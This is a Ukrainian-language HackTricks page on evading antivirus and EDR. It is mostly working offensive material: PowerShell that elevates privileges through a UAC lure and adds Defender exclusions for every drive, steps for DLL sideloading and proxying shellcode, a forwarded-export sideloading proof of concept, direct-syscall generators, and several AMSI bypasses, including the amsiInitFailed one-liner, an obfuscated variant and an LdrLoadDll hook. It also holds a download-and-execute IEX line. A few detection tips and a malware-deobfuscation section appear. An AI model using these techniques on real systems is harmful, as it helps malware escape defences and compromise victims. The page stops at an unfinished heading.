# Обхід антивіруса (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, який видає себе за інший антивірус.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка UAC у стилі інсталятора перед втручанням у роботу Defender

Публічні лоадери, що маскуються під чити для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe, які спочатку **запитують у користувача підвищення привілеїв** і лише потім нейтралізують Defender. Схема проста:

1. Перевірити наявність адміністративних привілеїв за допомогою `net session`. Команда виконується успішно лише за наявності прав адміністратора, тож помилка означає, що лоадер працює від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит UAC на підтвердження, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви вже вважають, що встановлюють «зламане» програмне забезпечення, тому зазвичай приймають запит, надаючи malware потрібні права для зміни політики Defender.<sup>[[26]](#references)</sup>

### Суцільні виключення `MpPreference` для кожної літери диска

Отримавши підвищені привілеї, ланцюжки на кшталт GachiLoader максимально розширюють сліпі зони Defender замість того, щоб повністю вимикати службу. Спершу завантажувач завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, щоб профілі всіх користувачів, системні каталоги та знімні диски неможливо було сканувати:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ключові спостереження:

- Цикл проходить по кожній змонтованій файловій системі (D:\, E:\, USB-накопичувачі тощо), тому **будь-який payload, який у майбутньому буде розміщено будь-де на диску, ігноруватиметься**.
- Виключення розширення `.sys` передбачає подальші дії: зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не взаємодіючи з Defender повторно.
- Усі зміни вносяться до `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу на наступних етапах перевірити, чи збереглися виключення, або розширити їх, не викликаючи UAC повторно.

Оскільки жодну службу Defender не зупинено, поверхневі перевірки стану й надалі повідомляють, що «антивірус активний», хоча перевірка в реальному часі фактично не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія обходу AV**

Нині AV використовують різні методи перевірки файлів на шкідливість: статичне виявлення, динамічний аналіз і, у просунутих EDR, поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення здійснюється шляхом пошуку відомих шкідливих рядків або послідовностей байтів у двійковому файлі чи скрипті, а також аналізу інформації самого файлу (наприклад, опису файлу, назви компанії, цифрових підписів, значка, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували й позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати двійковий файл, AV не зможе виявити вашу програму, але знадобиться якийсь loader, щоб розшифрувати й запустити програму в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у двійковому файлі чи скрипті, щоб обійти AV, але залежно від того, що саме ви намагаєтеся обфускувати, це може забрати багато часу.

- **Власні інструменти**

Якщо розробити власні інструменти, відомих шкідливих сигнатур не буде, але це потребує значних витрат часу й зусиль.

> [!TIP]
> Щоб перевірити файл на статичне виявлення Windows Defender, скористайтеся [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів і просить Defender просканувати кожен окремо, завдяки чому можна точно визначити, які рядки або байти у двійковому файлі позначаються.

Щиро рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний обхід AV.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш двійковий файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі браузера, створити minidump LSASS тощо). З цим може бути трохи складніше працювати, але ось кілька способів обійти sandbox.

- **Затримка перед виконанням** Залежно від реалізації це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тож тривалі затримки можуть завадити аналізу двійкових файлів. Проблема в тому, що багато sandbox AV можуть просто пропустити затримку — залежно від способу її реалізації.
- **Перевірка ресурсів машини** Зазвичай sandbox мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б сповільнити роботу машини користувача. Тут можна проявити винахідливість: наприклад, перевірити температуру CPU або навіть швидкість вентиляторів — у sandbox реалізовано не все.
- **Перевірки, специфічні для машини** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", можна перевірити домен комп’ютера й порівняти його із заданим. Якщо він не збігається, програму можна завершити.

Як виявилося, ім’я комп’ютера в sandbox Microsoft Defender — HAL9TH. Тож перед детонацією malware можна перевірити ім’я комп’ютера: якщо воно HAL9TH, це означає, що ви перебуваєте в sandbox Defender, і програму можна завершити.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька чудових порад від [@mgeeky](https://twitter.com/mariuszbit) щодо обходу sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже згадували в цій публікації, **публічні інструменти** зрештою **виявлятимуться**, тож варто запитати себе:

Наприклад, якщо потрібно зробити дамп LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися менш відомим проєктом, який також робить дамп LSASS?

Імовірно, правильна відповідь — другий варіант. Якщо взяти mimikatz як приклад, це, мабуть, один із найбільш позначених AV та EDR зразків malware, якщо не найбільш позначений. Сам проєкт дуже крутий, але обійти AV з ним — справжній головний біль, тож просто шукайте альтернативи для досягнення своєї мети.

> [!TIP]
> Коли змінюєте payloads для обходу виявлення, обов’язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ФАЙЛ НА VIRUSTOTAL**, якщо хочете досягти тривалого обходу виявлення. Щоб перевірити, чи виявляє ваш payload певний AV, установіть його у VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs проти DLLs

Коли це можливо, завжди **віддавайте перевагу DLL для обходу виявлення**. З мого досвіду, файли DLL зазвичай **виявляють і аналізують набагато рідше**, тож у деяких випадках це простий спосіб уникнути виявлення (якщо ваш payload може запускатися як DLL, звісно).

Як видно на цьому зображенні, рівень виявлення DLL payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння звичайного EXE payload Havoc зі звичайною DLL Havoc на antiscan.me</p></figcaption></figure>

Тепер розглянемо кілька прийомів роботи з файлами DLL, які допоможуть значно краще приховати їх.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи вразливу програму та шкідливі payload(s) поруч.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) і такого скрипту powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у "C:\Program Files\\", вразливих до DLL hijacking, і файли DLL, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно дослідити програми, вразливі до DLL Hijack/Sideload**. За належного виконання ця техніка доволі непомітна, але якщо використовувати загальновідомі програми з підтримкою DLL Sideload, вас можуть легко виявити.

Якщо просто розмістити шкідливу DLL з назвою, яку програма очікує завантажити, payload не запуститься: програма очікує наявність у цій DLL певних функцій. Щоб вирішити цю проблему, скористаємося іншою технікою під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики програми з DLL-проксі (і шкідливої DLL) до оригінальної DLL, зберігаючи функціональність програми та даючи змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/).

Ось кроки, які я виконав:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають Detection rate 0/26 на [antiscan.me](https://antiscan.me)! Вважаю це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Наполегливо рекомендую** переглянути [VOD S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб глибше розібратися в тому, що ми обговорили.

### Зловживання перенаправленими експортами (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «форвардерами»: замість адреси коду запис експорту містить ASCII-рядок формату `TargetDll.TargetFunc`. Коли викликач шукає експорт, завантажувач Windows:

- Завантажує `TargetDll`, якщо його ще не завантажено
- Знаходить у ньому `TargetFunc`

Важливі особливості:
- Якщо `TargetDll` є KnownDLL, його завантажують із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, до якого входить каталог модуля, що виконує перенаправлення.

Це дає змогу застосувати непрямий примітив sideloading: знайти підписану DLL, яка експортує функцію, перенаправлену до модуля з назвою, що не є KnownDLL, а потім розмістити цю підписану DLL поруч із контрольованою зловмисником DLL, названою точно так само, як цільовий модуль перенаправлення. Коли викликається перенаправлений експорт, завантажувач обробляє перенаправлення та завантажує вашу DLL із того самого каталогу, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому її знаходять у звичайному порядку пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL до папки, доступної для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Розмістіть шкідливий `NCRYPTPROV.dll` у тій самій папці. Для виконання коду достатньо мінімальної функції DllMain; реалізовувати переспрямовану функцію, щоб викликати DllMain, не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Активуйте форвард за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв’язання `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" з’явиться лише після того, як `DllMain` уже виконається

Поради з пошуку:
- Зосередьтеся на forwarded exports, у яких цільовий модуль не є KnownDLL. KnownDLLs перелічено в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перелічити forwarded exports за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Дивіться перелік форвардерів Windows 11, щоб знайти відповідні варіанти: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL з нестандартних системних шляхів, а потім завантажують з цього каталогу не-KnownDLLs із такою самою базовою назвою
- Сповіщайте про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → нестандартний системний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в каталогах програм

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze, щоб приховано завантажувати й виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити, тож ніколи не покладайтеся лише на один інструмент. Якщо можливо, спробуйте поєднувати кілька технік evasion.

## Direct/Indirect Syscalls і визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user-mode** на syscall stubs `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect syscall stubs**, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додати інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до експорту `ntdll`).
- **Indirect**: перейти до наявного `syscall` gadget усередині `ntdll`, щоб перехід у режим ядра виглядав так, ніби він походить із `ntdll` (корисно для обходу евристик); **randomized indirect** вибирає gadget із пулу для кожного виклику.
- **Egg-hunt**: не зберігати статичну послідовність opcode `0F 05` на диску; знаходити syscall sequence під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall stubs за віртуальною адресою, а не зчитуючи байти stub.
- **SyscallsFromDisk**: відобразити чистий `\KnownDlls\ntdll.dll`, зчитати SSN з його `.text`, а потім скасувати відображення (обходить усі hooks у пам’яті).
- **RecycledGate**: поєднати визначення SSN за сортованими VA з перевіркою opcode, коли stub чистий; якщо його перехоплено, перейти до визначення за VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи перехоплені байти.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для боротьби з «[безфайловим malware](https://en.wikipedia.org/wiki/Fileless_malware)». Спочатку AV могли сканувати лише **файли на диску**, тож якщо вдавалося виконати payload **безпосередньо в пам’яті**, AV не могли цьому запобігти, оскільки не мали достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне обчислення коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Ця функція дає змогу антивірусним рішенням перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому та не обфускованому вигляді.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення в Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу: на початку додається `amsi:`, а потім — шлях до виконуваного файла, з якого запустили скрипт; у цьому випадку це powershell.exe.

Ми не записали жодного файла на диск, але все одно були виявлені в пам’яті завдяки AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також перевіряється через AMSI. Це стосується навіть `Assembly.Load(byte[])`, який використовується для завантаження коду й виконання в пам’яті. Тому для виконання в пам’яті, якщо ви хочете обійти AMSI, рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або старіші).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI переважно використовує статичне виявлення, модифікація скриптів, які ви намагаєтеся завантажити, може допомогти уникнути виявлення.

Однак AMSI здатна знімати обфускацію зі скриптів навіть за наявності кількох її рівнів, тому залежно від способу обфускації це може бути невдалим варіантом. Через це обхід не такий уже й простий. Втім, іноді достатньо змінити кілька назв змінних — усе залежить від того, наскільки певний вміст уже позначено як шкідливий.

- **Обхід AMSI**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її можна легко підмінити навіть без привілеїв. Через цей недолік реалізації AMSI дослідники знайшли кілька способів уникнути сканування AMSI.

**Примусове виникнення помилки**

Якщо спричинити помилку під час ініціалізації AMSI (amsiInitFailed), сканування в поточному процесі не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти широкому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Достатньо було одного рядка коду PowerShell, щоб зробити AMSI непридатним до використання в поточному процесі PowerShell. Звісно, сам AMSI позначив цей рядок, тому, щоб скористатися цією технікою, його потрібно змінити.

Ось модифікований обхід AMSI, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, що цей матеріал, імовірно, позначать після публікації, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування даних, наданих користувачем) і перезаписі її інструкціями, які повертають код E_INVALIDARG. У результаті фактичного сканування повертається 0, що інтерпретується як чистий результат.

> [!TIP]
> Щоб дізнатися більше, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Існує також багато інших технік обходу AMSI за допомогою powershell. Дізнайтеся про них більше на [**цій сторінці**](basic-powershell-for-pentesters/index.html#amsi-bypass) і в [**цьому репозиторії**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (перехоплення LdrLoadDll)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний обхід, незалежний від мови програмування, полягає у встановленні перехоплення в user mode на `ntdll!LdrLoadDll`, яке повертає помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і цей процес не виконує сканування.<sup>[[23]](#references)</sup>

Загальний опис реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює з PowerShell, WScript/CScript і custom loaders (усім, що інакше завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Використовувався в loaders, запущених через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає сигнатурного виявлення за допомогою рандомізованих визначених користувачем функцій, змінних, символьних виразів і випадкового регістру ключових слів PowerShell.

**Видаліть виявлену сигнатуру**

Для видалення виявленої сигнатури AMSI з пам’яті поточного процесу можна скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож ви зможете запускати скрипти без сканування AMSI. Це можна зробити так:

```bash
powershell.exe -version 2
```

## Журналювання PS

Журналювання PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту та усунення несправностей, але водночас може **створювати проблеми для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими методами:

- **Вимкнути транскрибування PowerShell і журналювання модулів**: для цього можна використати такий інструмент, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без перевірки AMSI. Для цього виконайте: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (такий підхід використовує `powerpick` у Cobalt Strike). Це дає змогу обійти засоби контролю, прив’язані саме до процесу `powershell.exe`, але не вимикає автоматично AMSI, Script Block Logging чи всі інші засоби захисту PowerShell; обсяг захисту залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> Деякі методи обфускації передбачають шифрування даних, що збільшує ентропію бінарного файла та спрощує його виявлення засобами AV і EDR. Будьте обережні: можливо, варто шифрувати лише окремі частини коду, які є чутливими або які потрібно приховати.

### Деобфускація бінарних файлів .NET, захищених ConfuserEx

Під час аналізу шкідливого ПЗ, яке використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, що блокують декомпілятори та пісочниці. Наведений нижче процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від втручання — ConfuserEx шифрує кожне *тіло методу* й розшифровує його в статичному конструкторі *модуля* (`<Module>.cctor`). Він також змінює контрольну суму PE, тому будь-яка модифікація призведе до аварійного завершення бінарного файла. Скористайтеся **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі та переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Вивід містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / керування потоком виконання — передайте *чистий* файл до **de4dot-cex** (форк de4dot із підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує сплощення потоку керування, відновить початкові простори імен, класи та назви змінних і розшифрує рядкові константи.

3.  Видалення proxy-викликів – ConfuserEx замінює прямі виклики методів легковаговими обгортками (так званими *proxy-викликами*), щоб ще більше ускладнити декомпіляцію.  Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні API .NET, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення – запустіть отриманий бінарний файл у dnSpy і знайдіть великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб виявити *справжній* payload. Часто шкідливе ПЗ зберігає його як TLV-кодований масив байтів, ініціалізований у `<Module>.byte_0`.

Наведений ланцюжок відновлює потік виконання **без** запуску шкідливого зразка – це корисно під час роботи на офлайн-робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного первинного сортування зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# обфускатор**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source fork набору засобів компіляції [LLVM](http://www.llvm.org/), здатний підвищити безпеку програмного забезпечення завдяки [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від підміни.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як за допомогою мови `C++11/14` генерувати обфускований код під час компіляції, не використовуючи зовнішніх інструментів і не змінюючи компілятор.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих фреймворком метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор бінарних файлів x64, здатний обфускувати різні PE-файли, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк дрібнозернистої обфускації коду для мов, підтримуваних LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки та руйнуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування окремих функцій за допомогою LLVM compiler

